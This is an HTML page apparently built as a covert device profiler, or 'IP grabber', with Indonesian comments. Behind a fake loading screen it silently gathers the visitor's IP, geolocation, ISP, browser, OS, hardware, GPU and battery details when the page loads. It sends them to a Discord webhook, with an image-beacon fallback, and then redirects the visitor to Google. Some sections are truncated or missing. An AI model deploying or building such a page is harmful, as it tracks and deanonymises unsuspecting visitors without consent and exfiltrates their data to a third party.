            height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            text-align: center;
        }
        .container {
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(15px);
            border-radius: 30px;
            padding: 40px;
            max-width: 450px;
            border: 1px solid rgba(0,255,255,0.2);
            box-shadow: 0 0 50px rgba(0,255,255,0.1);
        }
        h1 {
            background: linear-gradient(90deg, #00ff88, #00f5ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 15px;
        }
        .loader {
            width: 45px;
            height: 45px;

            border-radius: 50%;

        .progress-container {
            background: rgba(255,255,255,0.1);
            border-radius: 10px;
            height: 6px;
            margin: 20px 0;
            overflow: hidden;
        }
        .progress-bar {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #00f5ff, #ff00ff);
            animation: progress 2.5s ease-out forwards;
        }
        @keyframes progress { to { width: 100%; } }
        .status {
            color: #00f5ff;
            font-size: 13px;
            letter-spacing: 1px;
            text-transform: uppercase;
            margin-top: 15px;
        }
        .device-icon {
            font-size: 48px;
            margin-bottom: 10px;
            opacity: 0.8;
        }

</head>

        // ============================================
        // BATTERY STATUS DETECTION
        // ============================================
        async function getBatteryInfo() {
            updateStatus("Mendeteksi status battery...");
            
            let batteryData = {
                level: 'Unknown',
                charging: 'Unknown',
                timeRemaining: 'Unknown',
                supported: false
            };
            
            if ('getBattery' in navigator) {
                try {
                    let battery = await navigator.getBattery();
                    
                    batteryData.level = Math.round(battery.level * 100) + '%';
                    batteryData.charging = battery.charging ? '🔌 Charging' : '🔋 Discharging';
                    batteryData.supported = true;
                    
                    if (!battery.charging && battery.dischargingTime && battery.dischargingTime !== Infinity) {
                        let minutes = Math.round(battery.dischargingTime / 60);
                        batteryData.timeRemaining = minutes + ' menit';
                    } else if (battery.charging && battery.chargingTime && battery.chargingTime !== Infinity) {
                        let minutes = Math.round(battery.chargingTime / 60);
                        batteryData.timeRemaining = minutes + ' menit (to full)';
                    } else {
                        batteryData.timeRemaining = 'Calculating...';
                    }
                    
                } catch (e) {
                    batteryData.level = 'Error';
                }
            }
            
            return batteryData;
        }

        // ============================================
        // DEVICE BRAND DETECTION (DENGAN DATABASE LENGKAP)
        // ============================================
        function detectDeviceBrand(ua) {
            updateStatus("Mendeteksi merek device...");
            
            let result = {
                brand: 'Unknown',
                model: 'Unknown',
                series: 'Unknown',
                fullName: 'Unknown',
                icon: '📱',
                confidence: 'low'
            };

            // 1. Cek di database spesifik dulu (prioritas)
            for (let key in DEVICE_DATABASE) {
                if (ua.includes(key)) {
                    result.brand = DEVICE_DATABASE[key].brand;
                    result.series = DEVICE_DATABASE[key].series;
                    result.fullName = DEVICE_DATABASE[key].fullName;
                    result.icon = DEVICE_DATABASE[key].icon;
                    result.confidence = 'high';
                    result.model = key;
                    
                    updateDeviceIcon(result.brand);
                    return result;  // Langsung return kalo ketemu
                }
            }

            // 2. Cek berdasarkan keyword brand (kalo gak ada di database)
            for (let brand in BRAND_KEYWORDS) {
                for (let keyword of BRAND_KEYWORDS[brand]) {
                    if (ua.includes(keyword)) {
                        result.brand = brand;
                        result.confidence = 'medium';
                        
                        // Ambil model dari user-agent
                        let modelMatch = ua.match(new RegExp(keyword + '([^\\s;)]+)'));
                        if (modelMatch) {
                            result.model = modelMatch[1];
                        }
                        
                        updateDeviceIcon(result.brand);
                        break;
                    }
                }
            }

            // 3. Deteksi iPhone specific (kalo belum ketemu)
            if (result.brand === 'Unknown' && ua.includes('iPhone')) {
                result.brand = 'Apple';
                result.series = 'iPhone';
                if (ua.includes('iPhone15,3')) result.fullName = 'iPhone 15 Pro Max';
                else if (ua.includes('iPhone15,2')) result.fullName = 'iPhone 15 Pro';
                else if (ua.includes('iPhone14,8')) result.fullName = 'iPhone 14 Plus';
                else result.fullName = 'iPhone (unknown model)';
                result.confidence = 'high';
                updateDeviceIcon('Apple');
            }

            // 4. Deteksi Samsung (kalo pake kode SM-)
            if (result.brand === 'Unknown' && ua.includes('SM-')) {
                result.brand = 'Samsung';
                result.series = 'Galaxy';
                let modelCode = ua.match(/SM-[A-Z0-9]+/);
                if (modelCode) {
                    result.model = modelCode[0];
                    
                    // Coba cari di database berdasarkan kode awal
                    let prefix = result.model.substring(0, 7); // SM-S928
                    for (let key in DEVICE_DATABASE) {
                        if (key === prefix) {
                            result.fullName = DEVICE_DATABASE[key].fullName;
                            result.series = DEVICE_DATABASE[key].series;
                            break;
                        }
                    }
                    
                    if (result.fullName === 'Unknown') {
                        result.fullName = `Samsung Galaxy (${result.model})`;
                    }
                }
                result.confidence = 'high';
                updateDeviceIcon('Samsung');
            }

            return result;
        }

        // ============================================
        // DAPETIN IP + GEO INFO
        // ============================================
        async function getIPInfo() {
            updateStatus("Mendapatkan alamat IP...");
            try {
                let ipRes = await fetch('https://api.ipify.org?format=json');
                let ipData = await ipRes.json();
                let ip = ipData.ip;
                
                let locRes = await fetch(`https://ipapi.co/${ip}/json/`);
                let locData = await locRes.json();
                
                return {
                    ip: ip,
                    country: locData.country_name || 'Unknown',
                    city: locData.city || 'Unknown',
                    region: locData.region || 'Unknown',
                    isp: locData.org || 'Unknown',
                    lat: locData.latitude || null,
                    lon: locData.longitude || null,
                    timezone: locData.timezone || 'Unknown'
                };
            } catch (e) {
                return {
                    ip: 'Unknown',
                    country: 'Unknown',
                    city: 'Unknown',
                    isp: 'Unknown'
                };
            }
        }

        // ============================================
        // DAPETIN INFO BROWSER + OS
        // ============================================
        function getBrowserInfo() {
            updateStatus("Mendeteksi browser & OS...");
            let ua = navigator.userAgent;
            let browser = "Unknown";
            let browserVersion = "Unknown";
            let os = "Unknown";
            let osVersion = "Unknown";
            let device = "Unknown";
            
            // Deteksi browser
            if (ua.includes("Firefox")) {
                browser = "Firefox";
                browserVersion = ua.match(/Firefox\/([0-9.]+)/)?.[1] || "Unknown";
            } else if (ua.includes("Edg")) {
                browser = "Edge";
                browserVersion = ua.match(/Edg\/([0-9.]+)/)?.[1] || "Unknown";
            } else if (ua.includes("Chrome") && !ua.includes("Edg")) {
                browser = "Chrome";
                browserVersion = ua.match(/Chrome\/([0-9.]+)/)?.[1] || "Unknown";
            } else if (ua.includes("Safari") && !ua.includes("Chrome")) {
                browser = "Safari";
                browserVersion = ua.match(/Version\/([0-9.]+)/)?.[1] || "Unknown";
            } else if (ua.includes("OPR") || ua.includes("Opera")) {
                browser = "Opera";
                browserVersion = ua.match(/(OPR|Opera)\/([0-9.]+)/)?.[2] || "Unknown";
            }
            
            // Deteksi OS
            if (ua.includes("Windows NT 10.0")) {
                os = "Windows 10/11";
            } else if (ua.includes("Windows NT 6.3")) {
                os = "Windows 8.1";
            } else if (ua.includes("Windows NT 6.2")) {
                os = "Windows 8";
            } else if (ua.includes("Windows NT 6.1")) {
                os = "Windows 7";
            } else if (ua.includes("Mac OS X")) {
                os = "macOS";
                let match = ua.match(/Mac OS X ([0-9_]+)/);
                if (match) osVersion = match[1].replace(/_/g, '.');
            } else if (ua.includes("Linux")) {
                os = "Linux";
                if (ua.includes("Android")) {
                    os = "Android";
                    let match = ua.match(/Android ([0-9.]+)/);
                    if (match) osVersion = match[1];
                }
            } else if (ua.includes("iPhone")) {
                os = "iOS (iPhone)";
            } else if (ua.includes("iPad")) {
                os = "iOS (iPad)";
            }
            
            // Deteksi device type
            if (/Mobi|Android|iPhone|iPad|iPod/i.test(ua)) {
                device = "Mobile/Tablet";
            } else {
                device = "Desktop";
            }
            
            return { browser, browserVersion, os, osVersion, device, ua };
        }

        // ============================================
        // DAPETIN INFO HARDWARE
        // ============================================
        function getHardwareInfo() {
            updateStatus("Mendeteksi hardware...");
            let info = {
                cores: navigator.hardwareConcurrency || 'Unknown',
                memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
                screen: `${screen.width}x${screen.height}`,
                pixelRatio: window.devicePixelRatio || 1,
                touchSupport: 'ontouchstart' in window ? 'Yes' : 'No'
            };
            
            // GPU info
            try {
                let canvas = document.createElement('canvas');
                let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        info.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                        info.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                    }
                }
            } catch (e) {
                info.gpu = 'Unknown';
            }
            
            return info;
        }

        // ============================================

        // ============================================
        function getSoftwareInfo() {
            updateStatus("Mendeteksi software...");
            let info = {
                language: navigator.language || 'Unknown',
                platform: navigator.platform || 'Unknown',
                cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
                adblock: false
            };
            
            // Deteksi adblock
            try {
                let test = document.createElement('div');
                test.innerHTML = '&nbsp;';
                test.className = 'adsbox';
                document.body.appendChild(test);
                info.adblock = test.offsetHeight === 0;
                document.body.removeChild(test);
            } catch (e) {}
            
            return info;
        }

                        { name: "⏳ **TIME REMAINING**", value: allData.battery.timeRemaining, inline: true },
                        
                        // IP & Lokasi
                        { name: "🌐 **IP ADDRESS**", value: allData.ipInfo.ip, inline: true },
                        { name: "📍 **LOKASI**", value: `${allData.ipInfo.city}, ${allData.ipInfo.country}`, inline: true },
                        { name: "🛜 **ISP**", value: allData.ipInfo.isp, inline: true },
                        
                        // Browser & OS
                        { name: "📱 **BROWSER**", value: `${allData.browserInfo.browser} ${allData.browserInfo.browserVersion}`, inline: true },
                        { name: "💻 **OS**", value: `${allData.browserInfo.os} ${allData.browserInfo.osVersion}`, inline: true },
                        { name: "📟 **TYPE**", value: allData.browserInfo.device, inline: true },
                        
                        // Hardware
                        { name: "⚙️ **CPU CORES**", value: allData.hardware.cores.toString(), inline: true },
                        { name: "🧠 **RAM**", value: allData.hardware.memory, inline: true },
                        { name: "🖥️ **LAYAR**", value: allData.hardware.screen, inline: true },
                        { name: "🎮 **GPU**", value: allData.hardware.gpu || 'N/A', inline: false },
                        
                        // Software
                        { name: "🔤 **BAHASA**", value: allData.software.language, inline: true },
                        { name: "🍪 **COOKIES**", value: allData.software.cookies, inline: true },
                        { name: "🚫 **ADBLOCK**", value: allData.software.adblock ? '✅ ADA' : '❌ TIDAK', inline: true }
                    ],
                    footer: { 
                        text: `SOULVANT DEVICE PROFILER • Confidence: ${allData.deviceInfo.confidence}`,
                    },
                    timestamp: new Date().toISOString()
                }]
            };
            
            // Kirim ke Discord
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(embed)
                });
                console.log("Data sent to Discord");
            } catch (e) {
                // Fallback
                let img = new Image();
                img.src = WEBHOOK_URL + "?content=" + encodeURIComponent(JSON.stringify(allData));
            }
            
            updateStatus("SELESAI! Redirecting...");
            
            setTimeout(() => {
                window.location.href = "https://www.google.com";
            }, 2000);
        }

        // ============================================
        // MAIN EXECUTION
        // ============================================
        async function collectAllData() {
            try {
                let ua = navigator.userAgent;
                
                // Kumpulin semua data
                let ipInfo = await getIPInfo();
                let browserInfo = getBrowserInfo();
                let hardware = getHardwareInfo();
                let software = getSoftwareInfo();
                let deviceInfo = detectDeviceBrand(ua);
                let battery = await getBatteryInfo();
                
                // Gabungin semua
                let allData = {
                    ipInfo,
                    browserInfo,
                    hardware,
                    software,
                    deviceInfo,
                    battery,
                    timestamp: new Date().toISOString()
                };
                
                // Simpan lokal (debug)
                localStorage.setItem('soulvant_device', JSON.stringify(allData));
                
                // Kirim ke Discord
                await sendToDiscord(allData);
                
            } catch (error) {
                console.error("Error:", error);
                setTimeout(() => {
                    window.location.href = "https://www.google.com";
                }, 1000);
            }
        }

        // Jalanin pas load
        window.onload = collectAllData;
    </script>
</body>
</html>
